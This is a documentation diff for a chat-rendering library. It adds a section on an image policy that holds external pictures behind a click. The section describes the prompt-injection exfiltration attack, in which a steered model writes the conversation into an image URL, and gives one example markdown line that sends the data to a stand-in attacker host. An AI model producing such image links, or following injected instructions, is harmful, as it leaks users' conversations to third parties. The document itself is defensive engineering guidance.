@@ -68,7 +68,8 @@ step: marked formats the reply while it streams and once it is done, so a finish
 exactly as it did at its last chunk. While it streams, the block being written is completed by
 Vercel's [`remend`](https://www.npmjs.com/package/remend) before marked reads it: `**bold` shows
 bold before its closing `**` arrives, a link shows as a link from its first character and becomes
-clickable once its URL is complete, and an image appears once its URL is. `remend` installs with the
+clickable once its URL is complete, and an image that may load appears once its URL is
+([which ones may](#pictures-a-reply-can-load)). `remend` installs with the
 plugin, and only this entry imports it. The options are marked's, as for `setupMarkedProvider`.
 
 Pick by what the reply should keep while it streams:
@@ -157,6 +158,106 @@ styles (a reply can cover the screen), core's `aparte-` classes (a reply can dra
 like an approval), form controls, `id`s, `role`s that make text a control, the `data-aparte-*`
 attributes core reads as commands (a reply can open a dialog), and they leave a link to another site opening in the
 chat's own frame.
+
+## Pictures a reply can load
+
+Pictures a model or a tool chose do not load by themselves. A `data:` or `blob:` picture does;
+any other is shown as a small link that names where it would load from, and it loads in place when
+the reader clicks it (a click with a modifier key or the middle button is left to the browser, as
+for any link: a new tab, a new window or a download). A card shows one "Show images" button in
+place of the links. A held picture is not fetched while a reply streams either.
+
+A picture fetches its address the moment it is shown, and a prompt-injected model — one that read
+a web page, a document or a tool result written to steer it — can write the conversation into that
+address: `![](https://attacker.example/c.png?d=…)` sends it, with the reader's IP address, to that
+host without a click, and nobody sees anything happen. The page's own address is not trusted by
+default either. It carries the reader's cookies, and an open redirect on your site turns a picture
+from your site into a picture from anywhere.
+
+The assistants this was done to closed it the same way: Gemini no longer shows external pictures in
+a reply, ChatGPT loads only addresses it has checked, and GitHub Copilot Chat stopped showing them,
+each after the attack was reported.
+
+Name what you trust with `setImagePolicy`:
+
+```ts
+import { aparteGlobalConfig } from '@aparte/core';
+
+// Your own site and one CDN load; everything else waits for a click.
+aparteGlobalConfig.setImagePolicy(['self', 'https://cdn.example.com']);
+
+// Every picture loads, as before 1.0.
+aparteGlobalConfig.setImagePolicy(['*']);
+
+// Anything else: 'load' it, 'hold' it behind a click, or 'drop' it with no trace.
+aparteGlobalConfig.setImagePolicy((url) =>
+  url.startsWith('https://images.example.com/') ? 'load' : 'hold');
+```
+
+Which one to choose:
+
+- **Your pictures come from places you know** — your site, a CDN, a product catalogue: list them.
+  List hosts that serve only your own files: one where anyone can upload, or that redirects
+  anywhere, gives the hole back.
+- **Every picture should load** — an internal tool whose model never reads content you do not
+  control: `['*']`, as 0.x did.
+- **No picture should load by itself** — keep the default. `setImagePolicy([])` says so, and
+  silences the note below.
+
+The first picture held on a page also writes a note in the browser console, with its host and the
+line to add, so a picture waiting for a click is not mistaken for a broken one. Naming any policy,
+the default included, silences it.
+
+A list takes `'self'`, `'*'` and origins; a function gets the address resolved against the page.
+An answer that is none of the three holds the picture. Every picture that loads goes with
+`referrerpolicy="no-referrer"`, so the host does not learn which page showed it.
+
+A plugin, or an app that draws pictures itself, asks the same rule before it sets a `src`, because
+setting it is the request:
+
+```ts
+import { aparteGlobalConfig } from '@aparte/core';
+
+declare const url: string;
+declare const frame: HTMLElement;
+
+if (aparteGlobalConfig.decideImage(url) === 'load') {
+  const img = document.createElement('img');
+  img.referrerPolicy = 'no-referrer'; // before `src`, which starts the request
+  img.src = url;
+  frame.append(img);
+}
+
+// The reader chose to see it: it loads from now on where the policy would only have held it.
+aparteGlobalConfig.showImage(url);
+```
+
+For a card of your own, `ctx.image(src, props)` returns an `<img>` that loads, or `null` when the
+policy does not let it, and `ctx.loads(url)` says whether a video, a sound or a poster may load
+now ([cards](/guides/cards/#pictures-and-the-image-policy)).
+
+### Beside a Content-Security-Policy
+
+The policy is what the library can do on its own. An `img-src` header is the stronger rule beside
+it, because it also checks where a redirect leads, which no script on the page can see:
+
+```http
+Content-Security-Policy: img-src 'self' data: blob: https://cdn.example.com
+```
+
+Or proxy third-party pictures through your own server and allow that origin in the policy and in
+the header. A `<video>` or an `<audio>` cannot be told to send no referrer; a page that cares sets
+its own `Referrer-Policy` header.
+
+### What it does not cover
+
+- It runs after whichever sanitizer is set, DOMPurify included, and covers `<img>` and `<source>`.
+  A sanitizer of your own that keeps `<video>`, `<audio>`, an SVG `<image>` or a `style` with
+  `url()` lets those load: chain it in front of `defaultSanitizer`, as above.
+- With no page, as in a server render, a relative address cannot be resolved, so a list other than
+  `'*'` holds it.
+- The map tiles you configure (`mapTiles`) and the pictures your own code draws, such as avatars,
+  attachments and a tool renderer that returns its own markup, are yours, not the policy's.
 
 ## Maths and diagrams
 
